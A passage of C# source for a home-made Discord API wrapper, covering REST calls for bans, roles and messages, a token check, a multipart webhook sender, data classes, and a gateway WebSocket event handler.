            DeleteMessageDays = DeleteMessageDays > 7 ? 7 : DeleteMessageDays;
            DeleteMessageDays = DeleteMessageDays < 0 ? 0 : DeleteMessageDays;

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/bans/{UserId}");
            request.Headers.Set("Authorization", this.Token);
            request.Method = "PUT";

            byte[] requestBytes = new ASCIIEncoding().GetBytes("{\"reason\":\"" + JsonConvert.SerializeObject(Reason) + "\", \"delete_message_days\": \"" + JsonConvert.SerializeObject(DeleteMessageDays) + "\"}");
            Stream requestStream = request.GetRequestStream();
            requestStream.Write(requestBytes, 0, requestBytes.Length);
            requestStream.Dispose();

            return ((HttpWebResponse)request.GetResponse()).StatusCode == HttpStatusCode.NoContent;
        }

        public bool UnBanMember(ulong GuildId, ulong UserId)
        {

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/bans/{UserId}");
            request.Headers.Set("Authorization", this.Token);
            request.Method = "DELETE";

            return ((HttpWebResponse)request.GetResponse()).StatusCode == HttpStatusCode.NoContent;
        }

        public DiscordRole[] GetGuildRoles(ulong GuildId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/roles");
            request.Headers.Set("Authorization", this.Token);

            return JsonConvert.DeserializeObject<DiscordRole[]>(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
        }

        public bool DeleteGuildRole(ulong GuildId, ulong RoleId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/roles/{RoleId}");
            request.Headers.Set("Authorization", this.Token);
            request.Method = "DELETE";

            return ((HttpWebResponse)request.GetResponse()).StatusCode == HttpStatusCode.NoContent;
        }

        public bool GetGuildInvites(ulong GuildId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/guilds/{GuildId}/invites");
            request.Headers.Set("Authorization", this.Token);

            throw new NotImplementedException();
        }

        public DiscordMessage[] GetChannelMessages(ulong ChannelId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/channels/{ChannelId}/messages");
            request.Headers.Set("Authorization", this.Token);

            return JsonConvert.DeserializeObject<DiscordMessage[]>(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
        }

        public DiscordMessage GetChannelMessage(ulong ChannelId, ulong MessageId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{this.Endpoint}/channels/{ChannelId}/messages/{MessageId}");
            request.Headers.Set("Authorization", this.Token);

            return JsonConvert.DeserializeObject<DiscordMessage>(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd());
        }
    }

    public class Config
    {
        public int GatewayVersion { get; private set; } = 8;
        public int EndpointVersion { get; set; } = 9;
    }

    public static class Extensions
    {
        static public bool IsValidToken(string token)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/@me");
            request.Headers.Set("Authorization", token);
            request.ContentType = "application/json";

            try
            {
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                    return true;
            }
            catch { return false; }
        }

        public static byte[] Encode(this string source)
            => Encoding.UTF8.GetBytes(source);
        public static string Decode(this byte[] source)
            => Encoding.UTF8.GetString(source);

        public static void Write(this MemoryStream source, string str)
        {
            byte[] buffer = str.Encode();
            source.Write(buffer, 0, buffer.Length);
        }

        public static int? ToHex(this Color? color)
        {
            string HS =
                color?.R.ToString("X2") +
                color?.G.ToString("X2") +
                color?.B.ToString("X2");

            int hex;
            if (int.TryParse(HS, System.Globalization.NumberStyles.HexNumber, null, out hex))
                return hex;
            else return null;
        }

        public static Color? ToColor(this int? hex)
        {
            if (hex == null)
                return null;

            return Color.FromArgb(255, Color.FromArgb(int.Parse(hex?.ToString())));
        }

        public static string Decode(this Stream source)
        {
            using (StreamReader reader = new StreamReader(source))
                return reader.ReadToEnd();
        }
    }

    public static class Structures
    {
        public class DiscordWebhook
        {
            /// <summary>
            /// Webhook url
            /// </summary>
            public string Url { get; set; }

            public DiscordWebhook(string url)
            {
                this.Url = url;
            }

            private void AddField(MemoryStream stream, string bound, string cDisposition, string cType, byte[] data)
            {
                string prefix = stream.Length > 0 ? "\r\n--" : "--";
                string fBegin = $"{prefix}{bound}\r\n";

                stream.Write(fBegin);
                stream.Write(cDisposition);
                stream.Write(cType);
                stream.Write(data, 0, data.Length);
            }

            private void SetJsonPayload(MemoryStream stream, string bound, string json)
            {
                string cDisposition = "Content-Disposition: form-data; name=\"payload_json\"\r\n";
                string cType = "Content-Type: application/octet-stream\r\n\r\n";
                AddField(stream, bound, cDisposition, cType, json.Encode());
            }

            private void SetFile(MemoryStream stream, string bound, int index, FileInfo file)
            {
                string cDisposition = $"Content-Disposition: form-data; name=\"file_{index}\"; filename=\"{file.Name}\"\r\n";
                string cType = "Content-Type: application/octet-stream\r\n\r\n";
                AddField(stream, bound, cDisposition, cType, File.ReadAllBytes(file.FullName));
            }

            /// <summary>
            /// Send webhook message
            /// </summary>
            public void Send(DiscordMessage message, params FileInfo[] files)
            {
                if (string.IsNullOrEmpty(Url))
                    throw new ArgumentNullException("Invalid Webhook URL.");

                string bound = $"------------------------{DateTime.Now.Ticks.ToString("x")}";

                WebClient webhook = new WebClient();
                webhook.Proxy = new WebProxy();
                webhook.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);

                MemoryStream stream = new MemoryStream();
                for (int i = 0; i < files.Length; i++)
                    SetFile(stream, bound, i, files[i]);

                string json = JsonConvert.SerializeObject(message);
                SetJsonPayload(stream, bound, json);
                stream.Write($"\r\n--{bound}--");

                try
                {
                    webhook.UploadData(Url, stream.ToArray());
                }
                catch (WebException ex)
                {
                    throw new WebException(ex.Response.GetResponseStream().Decode());
                }
                stream.Dispose();
            }

            public void Send(DiscordEmbed embed)
            {
                if (string.IsNullOrEmpty(Url))
                    throw new ArgumentNullException("Invalid Webhook URL.");

                string bound = "------------------------" + DateTime.Now.Ticks.ToString("x");

                WebClient webhook = new WebClient();
                webhook.Proxy = new WebProxy();
                webhook.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);

                MemoryStream stream = new MemoryStream();

                string json = "{\"embeds\":[" + JsonConvert.SerializeObject(embed) + "]}";
                SetJsonPayload(stream, bound, json);
                stream.Write($"\r\n--{bound}--");

                try
                {
                    webhook.UploadData(Url, stream.ToArray());
                }
                catch (WebException ex)
                {
                    Thread.Sleep(150);
                    throw new WebException(ex.Response.GetResponseStream().Decode());
                }
                stream.Dispose();
            }
        }

        public enum ChannelType
        {
            Text,
            DM,
            Voice,
            Group,
            Category,
            News,
            Store,
            News_Thread,
            Public_Thread,
            Private_Thread,
            Stage_Voice
        }

        public enum DiscordIntents
        {
            GUILDS = 1 << 0,
            GUILD_MEMBERS = 1 << 1,
            GUILD_BANS = 1 << 2,
            GUILD_EMOJIS = 1 << 3,
            GUILD_INTEGRATIONS = 1 << 4,
            GUILD_WEBHOOKS = 1 << 5,
            GUILD_INVITES = 1 << 6,
            GUILD_VOICE_STATES = 1 << 7,
            GUILD_PRESENCES = 1 << 8,
            GUILD_MESSAGES = 1 << 9,
            GUILD_MESSAGE_REACTIONS = 1 << 10,
            GUILD_MESSAGE_TYPING = 1 << 11,
            DIRECT_MESSAGES = 1 << 12,
            DIRECT_MESSAGE_REACTIONS = 1 << 13,
            DIRECT_MESSAGE_TYPING = 1 << 14,
        }

        public enum OpCodes
        {
            Dispatch,
            Heartbeat,
            Identify,
            Presence_Update,
            Voice_State_Update,
            Resume,
            Reconnect,
            Request_Guild_Members,
            Invalid_Session,
            Hello,
            Heartbeat_ACK
        }

        public class Opcode
        {
            public int op { get; set; }
            public string t { get; set; }
        }

        public enum ClientType
        {
            User,
            Bot
        }

        public class DiscordUser
        {
            public string Bio;
            public Color BannerColor;
            public string Banner;
            public string Email;
            public bool Verified;
            public ulong Id;
            public string Username;
            public string Avatar;
            public string Discriminator;
            public int Flags;
            public DateTimeOffset CreatedAt;
        }

        public class DiscordRequest
        {
            public string ResponseBody { get; set; }
            public bool Succeeded { get; set; }
        }

        public class Embed
        {
            public class DiscordEmbed
            {
                public DiscordEmbed()
                {
                    Fields = new List<EmbedField>();
                }

                [JsonProperty("title")]
                /// <summary>
                /// Embed title
                /// </summary>
                public string Title { get; set; }

                [JsonProperty("description")]
                /// <summary>
                /// Embed description
                /// </summary>
                public string Description { get; set; }

                [JsonProperty("url")]
                /// <summary>
                /// Embed url
                /// </summary>
                public string Url { get; set; }

                /// <summary>
                /// Embed timestamp
                /// </summary>
                public DateTime? Timestamp
                {
                    get => String.IsNullOrEmpty(StringTimestamp) ? DateTime.UtcNow : DateTime.Parse(StringTimestamp);
                    set => StringTimestamp = value?.ToString("yyyy-MM-ddTHH\\:mm\\:ss.fffffffzzz");
                }

                [JsonProperty("timestamp")]
                public string StringTimestamp { get; private set; }

                /// <summary>
                /// Embed color
                /// </summary>
                public Color? Color
                {
                    get => HexColor.ToColor();
                    set => HexColor = value.ToHex();
                }

                [JsonProperty("color")]
                public int? HexColor { get; private set; }

                [JsonProperty("footer")]
                /// <summary>
                /// Embed footer
                /// </summary>
                public EmbedFooter Footer { get; set; }

                [JsonProperty("image")]
                /// <summary>
                /// Embed image
                /// </summary>
                public EmbedMedia Image { get; set; }

                [JsonProperty("thumbnail")]
                /// <summary>
                /// Embed thumbnail
                /// </summary>
                public EmbedMedia Thumbnail { get; set; }

                [JsonProperty("video")]
                /// <summary>
                /// Embed video
                /// </summary>
                public EmbedMedia Video { get; set; }

                [JsonProperty("provider")]
                /// <summary>
                /// Embed provider
                /// </summary>
                public EmbedProvider Provider { get; set; }

                [JsonProperty("author")]
                /// <summary>
                /// Embed author
                /// </summary>
                public EmbedAuthor Author { get; set; }

                [JsonProperty("fields")]
                /// <summary>
                /// Embed fields list
                /// </summary>
                public List<EmbedField> Fields { get; set; }
            }

            public class EmbedFooter
            {
                [JsonProperty("text")]
                /// <summary>
                /// Footer text
                /// </summary>
                public string Text { get; set; }

                [JsonProperty("icon_url")]
                /// <summary>
                /// Footer icon
                /// </summary>
                public string IconUrl { get; set; }

                [JsonProperty("proxy_icon_url")]
                /// <summary>
                /// Footer icon proxy
                /// </summary>
                public string ProxyIconUrl { get; set; }
            }

            public class EmbedMedia
            {
                [JsonProperty("url")]
                /// <summary>
                /// Media url
                /// </summary>
                public string Url { get; set; }

                [JsonProperty("proxy_url")]
                /// <summary>
                /// Media proxy url
                /// </summary>
                public string ProxyUrl { get; set; }

                [JsonProperty("height")]
                /// <summary>
                /// Media height
                /// </summary>
                public int? Height { get; set; }

                [JsonProperty("width")]
                /// <summary>
                /// Media width
                /// </summary>
                public int? Width { get; set; }
            }

            public class EmbedProvider
            {
                [JsonProperty("name")]
                /// <summary>
                /// Provider name
                /// </summary>
                public string Name { get; set; }

                [JsonProperty("url")]
                /// <summary>
                /// Provider url
                /// </summary>
                public string Url { get; set; }
            }

            public class EmbedAuthor
            {
                [JsonProperty("name")]
                /// <summary>
                /// Author name
                /// </summary>
                public string Name { get; set; }

                [JsonProperty("url")]
                /// <summary>
                /// Author url
                /// </summary>
                public string Url { get; set; }

                [JsonProperty("icon_url")]
                /// <summary>
                /// Author icon
                /// </summary>
                public string IconUrl { get; set; }

                [JsonProperty("proxy_icon_url")]
                /// <summary>
                /// Author icon proxy
                /// </summary>
                public string ProxyIconUrl { get; set; }
            }

            public class EmbedField
            {
                [JsonProperty("name")]
                /// <summary>
                /// Field name
                /// </summary>
                public string Name { get; set; }

                [JsonProperty("value")]
                /// <summary>
                /// Field value
                /// </summary>
                public string Value { get; set; }

                [JsonProperty("inline")]
                /// <summary>
                /// Field align
                /// </summary>
                public bool? InLine { get; set; }
            }

            public static string GetAvatarUrl(DiscordUser user, int Scale = 512)
            {
                return "https://cdn.discordapp.com/avatars/" + user.Id + "/" + user.Avatar + $".png?size={Scale}";
            }
        }

        public class Attachment
        {
            public string URL { get; set; }
            public int Size { get; set; }
            public string Filename { get; set; }
        }

        public class DiscordEmoji
        {
            public string Id { get; set; }
            public string Name { get; set; }
            public bool Animated { get; set; }
        }

        public partial class DropdownOption
        {
            public DropdownOption(string _label, string _description, string _value, bool _default = false, DiscordEmoji _emoji = null)
            {
                Label = _label;
                Emoji = _emoji;
                Value = _value;
                @Default = _default;
                Description = _description;
            }

            public string Label { get; set; }
            public string Description { get; set; }
            public DiscordEmoji Emoji { get; set; }
            public string Value { get; set; }
            public bool @Default { get; set; }
        }

        public partial class Component
        {
            public Component(string text, ButtonStyle buttonStyle, string data, bool isDisabled = false, DiscordEmoji _emoji = null)
            {
                if (buttonStyle == ButtonStyle.Link)
                    URL = data;
                else
                    Custom_Id = data;

                Label = text;
                Type = 2;
                Style = (int)buttonStyle;
                Disabled = isDisabled;
                Emoji = _emoji;
            }

            public Component(string _custom_id, string _placeholder, DropdownOption[] _options, int _max_values = 1, int _min_values = 0)
            {

                Min_Values = _min_values;
                Max_Values = _max_values;
                PlaceHolder = _placeholder;
                Options = _options;
                Custom_Id = _custom_id;
                Type = 3;
            }

            public DropdownOption[] Options { get; set; }
            public DiscordEmoji Emoji { get; set; }
            public int Type { get; set; }
            public string Label { get; set; }
            public int Style { get; set; }
            public bool Disabled { get; set; }
            public string Custom_Id { get; set; }
            public string URL { get; set; }

            public string PlaceHolder { get; set; }
            public int Max_Values { get; set; }
            public int Min_Values { get; set; }
            public enum ButtonStyle
            {
                Primary = 1,
                Secondary = 2,
                Success = 3,
                Destructive = 4,
                Link = 5
            }
        }

        public class DiscordMember
        {
            public DiscordUser User { get; set; }
            public string[] Roles { get; set; }
        }

        public class InteractionData
        {
            public string Custom_Id { get; set; }
            public int Component_Type { get; set; }
            public string[] Values { get; set; }


            public enum ComponentTypes
            {
                Button = 2,
                Dropdown = 3
            }
        }

        public class DiscordActivity
        {
            public string Name { get; set; }
            public ActivityType Type { get; set; }

            public enum ActivityType
            {
                Playing,
                Streaming,
                Listening,
                Watching
            }
        }

        public class Ratelimit
        {
            public string Message { get; set; }
            public double Retry_After { get; set; }
        }

        public class DiscordStatus
        {
            private string[] Satatus_Names = { "dnd", "idle", "online", "invisible" };
            public DiscordStatus(Type Status, DiscordActivity[] Activities = null, bool AFK = false)
            {
                this.Activities = Activities == null ? new DiscordActivity[] { } : Activities;
                this.AFK = AFK;
                this.Status = Satatus_Names[(int)Status];
            }

            public enum Type
            {
                Dnd,
                Idle,
                Online,
                Invisible
            }

            public int Since { get; set; }
            public DiscordActivity[] Activities { get; set; }
            public string Status { get; set; }
            public bool AFK { get; set; }
        }

        public class SocketTypes
        {
            public class ChangeStatus
            {
                public int op { get; set; }
                public DiscordStatus d { get; set; }
            }

            public enum InteractionReplyType
            {
                Edit = 7,
                Pong = 6
            }

            public partial class InteractionReply
            {
                public class InteractionData_Send
                {
                    public string Content { get; set; }
                    public Embed.DiscordEmbed[] Embeds { get; set; }
                    public ComponentContainer[] Components { get; set; }
                }

                public InteractionReply(InteractionReplyType replyType, ComponentContainer[] replyComponents = null, string message = null, Embed.DiscordEmbed embed = null)
                {
                    InteractionData_Send dat = new InteractionData_Send()
                    {
                        Content = message,
                        Embeds = new Embed.DiscordEmbed[] { embed },
                        Components = replyComponents
                    };

                    Type = (int)replyType;
                    Data = dat;
                }

                public InteractionData_Send Data { get; set; }
                public int Type { get; set; }

            }
            public class DiscordGuildMessage
            {
                public string Guild_Id { get; set; }
                public string Content { get; set; }
                public Embed.DiscordEmbed[] Embeds { get; set; }
                public ComponentContainer[] Components { get; set; }
                public MessageReference Message_Reference { get; set; }
                public DiscordUser Author { get; set; }
                public string Id { get; set; }
                public string Channel_Id { get; set; }
            }
        }

        public class Interaction
        {
            public DiscordUser user { get; set; }
            public DiscordMember member { get; set; }
            public InteractionData data { get; set; }
            public DiscordMessage message { get; set; }
            public string id { get; set; }
            public string token { get; set; }
        }

        public partial class ComponentContainer
        {
            public ComponentContainer(Component[] _components)
            {
                if (_components.Length > 5)
                {
                    throw new Exception("Too many components");
                }
                components = _components;
                type = 1;
            }
            public Component[] components { get; set; }
            public int type { get; set; }
        }

        public class DiscordMessage
        {
            public string Guild_id { get; set; }
            public string Content { get; set; }
            public Embed.DiscordEmbed[] Embeds { get; set; }

            public Embed.DiscordEmbed Embed { get; set; }
            public MessageReference Message_reference { get; set; }
            public DiscordUser Author { get; set; }
            public string Id { get; set; }
            public string Channel_id { get; set; }

            public Attachment[] attachments { get; set; }
        }

        public class MessageReference
        {
            public string message_id { get; set; }
            public string channel_id { get; set; }
            public string guild_id { get; set; }
        }

        public class DiscordGuild
        {
            public string Id { get; set; }
            public string Name { get; set; }
            public string Icon { get; set; }
            public bool Owner { get; set; }
            public string Permissions { get; set; }
            public string[] Features { get; set; }
        }

        public class DiscordGuildChannel
        {
            public ulong Id;
            public ulong Guild_Id;
            public ChannelType Type;
            public int Position;
            public string Name;
            public string Topic;
            public bool Nsfw;
            public int Bitrate;
            public bool Owner;
            public int MessageCount;
            public int MemberCount;
        }

        public class DiscordBan
        {
            public string Reason;
            public DiscordUser User;
        }

        public class DiscordRole
        {
            public ulong Id;
            public string Name;
            public bool Hoist;
            public int Position;
            public string Permissions;
            public bool Managed;
            public bool Mentionable;
        }

        public class DiscordInvite
        {
            public string Code;
            public DiscordGuildChannel Channel;
            public DiscordUser Inviter;
            public int OnlineMembersCount;
            public int TotalMembersCount;
            public DateTimeOffset Expries_At;
        }
    }

    public static class EventsArgs
    {
        public class InteractionCreateEventArgs
        {
            public Interaction Interaction { get; set; }
            public DiscordSocketClient Client { get; set; }
        }

        public class MessageReceivedEventArgs
        {
            public DiscordMessage Message { get; set; }
            public DiscordSocketClient Client { get; set; }
        }

        public class GuildMemberAddEventArgs
        {
            public DiscordMember Member { get; set; }
            public DiscordSocketClient Client { get; set; }
        }

        public class GuildMemberRemoveEventArgs
        {
            public DiscordMember Member { get; set; }
            public DiscordSocketClient Client { get; set; }
        }

        public class JoinedGuildEventArgs
        {
            public DiscordGuild Guild;
            public DiscordSocketClient Client { get; set; }
        }
    }
}

namespace Discord.Backend
{
    public class Gateway
    {
        public WebSocket Socket;
        private ClientType Type;
        private DiscordSocketClient client;
        private DiscordStatus Status;

        public Gateway(ClientType type, DiscordStatus Status, int GatewayVersion, int EndpointVersion)
        {
            Socket = new WebSocket($@"wss://gateway.discord.gg/?v={GatewayVersion}&encoding=json");
            Socket.OnMessage += Socket_OnMessage;
#if DEBUG
            Console.WriteLine("WebSocket Connection is Established!");
#endif
            this.Status = Status;
            this.Type = type;
        }

        private void Socket_OnMessage(object sender, MessageEventArgs e)
        {
            new Thread(() =>
            {
                if (Socket.ReadyState == WebSocketState.Open)
                {
                    Opcode opcode = JsonConvert.DeserializeObject<Opcode>(e.Data);

                    switch (opcode.op)
                    {
                        case 10:
#if DEBUG
                            Console.WriteLine("Wumpus said Hello.\nIdentifying.");
#endif
                            Socket.Send(String.Format("{\"op\": 2, \"d\": { \"token\": \"{0}\", \"intents\": 4611, \"presence\": {1}, \"properties\": { \"$os\": \"linux\", \"$browser\": \"QvoidWrapper\", \"$device\": \"QvoidWrapper\" } } }", client.Token, JsonConvert.SerializeObject(Status)));
#if DEBUG
                            Console.WriteLine("Identifying successfully sent.");
#endif
                            break;
                        case 9:
#if DEBUG
                            Console.WriteLine("Session invalidated by server");
#endif
                            try { Socket.Close(); } catch { }
                            break;
                        case 7:
                            Console.WriteLine("Reconnection requested by server");
                            Connect(client.Token, client);
                            break;
                        case 0:
                            Handler(e.Data, opcode.t);
                            break;
                        default:
                            break;
                    }
                }
            }).Start();
        }

        public void Handler(string response, string TEvent)
        {
            if (TEvent == "READY")
            {
                string temp = response.ToString().Substring(response.ToString().IndexOf("user\":"));
                temp = temp.Remove(temp.IndexOf("tutorial"));
                temp = temp.Remove(temp.Length - 2).Remove(0, 6);
                client.User = JsonConvert.DeserializeObject<DiscordUser>(temp);
                client.User.CreatedAt = DateTimeOffset.FromUnixTimeMilliseconds((long)((client.User.Id >> 22) + 1420070400000UL));
#if DEBUG
                if (!client.User.Verified) Console.WriteLine("The client cannot recive messages because he is not verified.");
#endif
                client.LoggedIn(client);

                new Thread(() =>
                {
                    Console.WriteLine("Heartbeating started.");
                    while (true)
                    {
                        Socket.Send("{\"op\": 1, \"d\": null}");
                        Thread.Sleep(30000);
                    }
                }).Start();
            }
            else if (TEvent == "MESSAGE_CREATE")
            {
                JObject data = JObject.Parse(response);

                MessageReceivedEventArgs args = new MessageReceivedEventArgs()
                {
                    Message = JsonConvert.DeserializeObject<DiscordMessage>(data["d"].ToString()),
                    Client = client
                };
                client.MessageReceived(args);
            }
            else if (TEvent == "INTERACTION_CREATE")
            {
                JObject data = JObject.Parse(response);

                InteractionCreateEventArgs args = new InteractionCreateEventArgs()
                {
                    Interaction = JsonConvert.DeserializeObject<Interaction>(data["d"].ToString()),
                    Client = client
                };
                client.InteractionReceived(args);
            }
            else if (TEvent == "GUILD_MEMBER_ADD")
            {
                JObject data = JObject.Parse(response);

                GuildMemberAddEventArgs args = new GuildMemberAddEventArgs()
                {
                    Member = JsonConvert.DeserializeObject<DiscordMember>(data["d"].ToString()),
                    Client = client
                };
                client.MemberJoined(args);
            }
            else if (TEvent == "GUILD_MEMBER_REMOVE")
            {
                JObject data = JObject.Parse(response);

                GuildMemberAddEventArgs args = new GuildMemberAddEventArgs()
                {
                    Member = JsonConvert.DeserializeObject<DiscordMember>(data["d"].ToString()),
                    Client = client
                };
                client.MemberJoined(args);
            }
            else if (TEvent == "GUILD_CREATE")
            {
                JObject data = JObject.Parse(response);

                JoinedGuildEventArgs args = new JoinedGuildEventArgs()
                {
                    Guild = JsonConvert.DeserializeObject<DiscordGuild>(data["d"].ToString()),
                    Client = client
                };
                client.JoinedGuild(args);
            }
            else if (TEvent == "GUILD_MEMBERS_CHUNK")
            {
                JObject data = JObject.Parse(response);
                JArray array = JArray.Parse(data["d"]["members"].ToString());
                if (client.WaitingForMembers)
                {
                    List<DiscordMember> Members = new List<DiscordMember>();
                    foreach (JObject user in array)
                        Members.Add(new DiscordMember { User = JsonConvert.DeserializeObject<DiscordUser>(user["user"].ToString()), Roles = JsonConvert.DeserializeObject<string[]>(user["roles"].ToString()) });

                    client.GuildMembers = Members.ToArray();
                    client.WaitingForMembers = false;
                }
            }
        }

        public void Connect(string Token, DiscordSocketClient client)
        {
            Socket.Connect();
            while (Socket.ReadyState == WebSocketState.Connecting)
                continue;

            this.client = client;
            this.client.Token = Token;
        }
    }
}
